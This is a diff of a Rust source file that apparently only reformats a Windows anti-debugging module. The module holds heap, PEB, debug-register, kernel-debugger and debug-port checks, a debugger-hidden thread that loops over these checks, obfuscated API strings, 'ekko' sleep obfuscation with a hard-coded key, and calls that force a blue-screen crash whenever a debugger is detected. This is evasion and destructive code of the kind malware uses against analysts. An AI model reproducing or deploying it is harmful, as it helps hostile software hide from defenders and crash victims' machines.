@@ -1,11 +1,10 @@
-
 use ntapi::ntpebteb::PEB;
 use winapi::shared::basetsd::ULONG_PTR;
-use winapi::shared::minwindef::{DWORD, PBYTE, HMODULE};
-use winapi::shared::ntdef::{NTSTATUS, PVOID, HANDLE, PULONG, BOOLEAN};
+use winapi::shared::minwindef::{DWORD, HMODULE, PBYTE};
+use winapi::shared::ntdef::{BOOLEAN, HANDLE, NTSTATUS, PULONG, PVOID};
 use winapi::um::heapapi::{GetProcessHeap, HeapWalk};
 use winapi::um::minwinbase::PROCESS_HEAP_ENTRY;
-use winapi::um::winnt::{PLIST_ENTRY};
+use winapi::um::winnt::PLIST_ENTRY;
 
 use std::ptr;
 use winapi::shared::minwindef::BOOL;
@@ -19,20 +18,19 @@ use winapi::um::tlhelp32::Process32NextW;
 use winapi::um::tlhelp32::PROCESSENTRY32W;
 use winapi::um::tlhelp32::TH32CS_SNAPPROCESS;
 
-use winapi::um::winuser::FindWindowW;
 use std::thread;
+use winapi::um::winuser::FindWindowW;
 
 use winapi::um::winuser::{GetShellWindow, GetWindowThreadProcessId};
 
-
+use std::ffi::CString;
+use std::mem::size_of;
+use winapi::ctypes::c_ulong;
+use winapi::shared::ntstatus::STATUS_SUCCESS;
+use winapi::um::libloaderapi::{GetProcAddress, LoadLibraryA};
 use winapi::um::memoryapi::{VirtualAlloc, VirtualFree, VirtualProtect};
 use winapi::um::sysinfoapi::{GetSystemInfo, SYSTEM_INFO};
 use winapi::um::winnt::{MEM_COMMIT, MEM_RELEASE, MEM_RESERVE, PAGE_EXECUTE_READWRITE, PAGE_GUARD};
-use winapi::ctypes::c_ulong;
-use winapi::shared::ntstatus::STATUS_SUCCESS;
-use std::mem::size_of;
-use winapi::um::libloaderapi::{LoadLibraryA, GetProcAddress};
-use std::ffi::CString;
 
 use std::ptr::null_mut;
 use winapi::shared::minwindef::FALSE;
@@ -42,9 +40,9 @@ use winapi::um::debugapi::DebugActiveProcess;
 use winapi::um::debugapi::WaitForDebugEvent;
 
 use winapi::shared::minwindef::ULONG;
-use winapi::um::winnt::DBG_CONTINUE;
-use winapi::um::processthreadsapi::{GetCurrentThread, GetThreadContext, GetCurrentProcess};
+use winapi::um::processthreadsapi::{GetCurrentProcess, GetCurrentThread, GetThreadContext};
 use winapi::um::winnt::CONTEXT;
+use winapi::um::winnt::DBG_CONTINUE;
 
 use winapi::um::winnt::CONTEXT_DEBUG_REGISTERS;
 
@@ -52,7 +50,7 @@ use std::process;
 
 use std::arch::asm;
 
-use crate::bsod::{nt_bsod, self};
+use crate::bsod::{self, nt_bsod};
 use crate::ekko;
 
 #[repr(C)]
@@ -88,9 +86,8 @@ pub fn check_heap() -> Result<bool, &'static str> {
         }
     }
 
-    let p_overlapped: *const DWORD = unsafe {
-        (heap_entry.lpData as *const u8).add(heap_entry.cbData as usize) as *const DWORD
-    };
+    let p_overlapped: *const DWORD =
+        unsafe { (heap_entry.lpData as *const u8).add(heap_entry.cbData as usize) as *const DWORD };
 
     if unsafe { *p_overlapped } == 0xABABABAB {
         return Ok(true);
@@ -139,13 +136,9 @@ pub fn check_remote_debugger_present() -> bool {
     }
 }
 
-
-
 pub fn create_debugger_hidden_thread() {
     let handler = thread::spawn(|| {
         // thread code
-        
-        
 
         const THREAD_HIDE_FROM_DEBUGGER: u32 = 0x11; //todo: verify this value
 
@@ -159,26 +152,26 @@ pub fn create_debugger_hidden_thread() {
         };
         let mut key_buf = "nvj8210rjnv0jr23n9h\0".as_bytes().to_vec();
         loop {
-
             match check_heap() {
                 Ok(result) => {
-                    if(result == true) {
+                    if (result == true) {
                         bsod::zw_bsod();
                         bsod::nt_bsod()
                     }
-                },
+                }
                 Err(e) => println!("error {}", e),
             }
-            
+
             //Run anti-debug checks in infinite loop
-            if(check_debugger_present() || 
-            check_remote_debugger_present() || 
-            check_drx_breakpoint() || 
-            check_kuser_shared_data_structure() || 
-            check_kernel_debugger() || 
-            adbg_nt_global_flag_peb() ||
-            adbg_being_debugged_peb() ||
-            query_kernel_debug_object()) {
+            if check_debugger_present()
+                || check_remote_debugger_present()
+                || check_drx_breakpoint()
+                || check_kuser_shared_data_structure()
+                || check_kernel_debugger()
+                || adbg_nt_global_flag_peb()
+                || adbg_being_debugged_peb()
+                || query_kernel_debug_object()
+            {
                 bsod::zw_bsod();
                 bsod::nt_bsod()
             }
@@ -186,9 +179,8 @@ pub fn create_debugger_hidden_thread() {
             ekko::ekko(4000, &mut key_buf);
         }
     });
-    
-    handler.join().unwrap();
 
+    handler.join().unwrap();
 }
 
 pub fn check_drx_breakpoint() -> bool {
@@ -222,35 +214,40 @@ pub fn check_kernel_debugger() -> bool {
         )
     };
 
-    status == STATUS_SUCCESS && system_info.debugger_enabled != 0 && system_info.debugger_not_present == 0
+    status == STATUS_SUCCESS
+        && system_info.debugger_enabled != 0
+        && system_info.debugger_not_present == 0
 }
 
 pub fn query_kernel_debug_object() -> bool {
-    let h_ntdll: HMODULE = unsafe { LoadLibraryA(CString::new(obfstr::obfstr!("ntdll.dll")).unwrap().as_ptr()) };
+    let h_ntdll: HMODULE =
+        unsafe { LoadLibraryA(CString::new(obfstr::obfstr!("ntdll.dll")).unwrap().as_ptr()) };
 
     if !h_ntdll.is_null() {
         let pfn_nt_query_information_process: TNtQueryInformationProcess = unsafe {
             std::mem::transmute(GetProcAddress(
                 h_ntdll,
-                CString::new(obfstr::obfstr!("NtQueryInformationProcess")).unwrap().as_ptr(),
+                CString::new(obfstr::obfstr!("NtQueryInformationProcess"))
+                    .unwrap()
+                    .as_ptr(),
             ))
         };
 
-            let mut dw_process_debug_port: DWORD = 0;
-            let mut dw_returned: ULONG = 0;
-            let status: NTSTATUS = unsafe {
-                pfn_nt_query_information_process(
-                    GetCurrentProcess(),
-                    PROCESS_DEBUG_PORT,
-                    &mut dw_process_debug_port as *mut _ as PVOID,
-                    std::mem::size_of::<DWORD>() as ULONG,
-                    &mut dw_returned,
-                )
-            };
+        let mut dw_process_debug_port: DWORD = 0;
+        let mut dw_returned: ULONG = 0;
+        let status: NTSTATUS = unsafe {
+            pfn_nt_query_information_process(
+                GetCurrentProcess(),
+                PROCESS_DEBUG_PORT,
+                &mut dw_process_debug_port as *mut _ as PVOID,
+                std::mem::size_of::<DWORD>() as ULONG,
+                &mut dw_returned,
+            )
+        };
 
-            return status == STATUS_SUCCESS && dw_process_debug_port == !0
+        return status == STATUS_SUCCESS && dw_process_debug_port == !0;
     } else {
-        return false
+        return false;
     }
 }
 
@@ -279,7 +276,7 @@ pub fn adbg_being_debugged_peb() -> bool {
         );
     }
 
-    return found != 0
+    return found != 0;
 }
 
 pub fn adbg_nt_global_flag_peb() -> bool {
@@ -307,10 +304,8 @@ pub fn adbg_nt_global_flag_peb() -> bool {
         );
     }
 
-    return found != 0
+    return found != 0;
 }
-
-
 
 extern "C" {
     fn NtSetInformationThread(
